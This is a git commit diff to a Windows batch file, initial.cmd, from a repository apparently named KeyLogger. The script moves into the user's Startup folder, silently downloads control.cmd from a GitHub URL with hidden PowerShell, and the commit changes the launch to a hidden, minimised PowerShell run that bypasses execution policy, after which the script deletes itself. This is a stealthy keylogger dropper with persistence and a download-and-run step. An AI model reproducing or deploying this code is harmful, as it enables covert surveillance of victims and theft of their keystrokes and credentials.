0f01b57f401535a968c6d0f2aa31bd80067fdb7d
huynh044 <143809063+huynh044@users.noreply.github.com>
2023-12-11 15:03:51 +0700

    Update initial.cmd

--- initial.cmd
+++ initial.cmd
@@ -5,7 +5,7 @@ set start_up="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\P
 cd %start_up%
 powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/control.cmd' -OutFile 'control.cmd'"
 
-control.cmd
+start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\control.cmd
 
 cd %initial%
 del initial.cmd
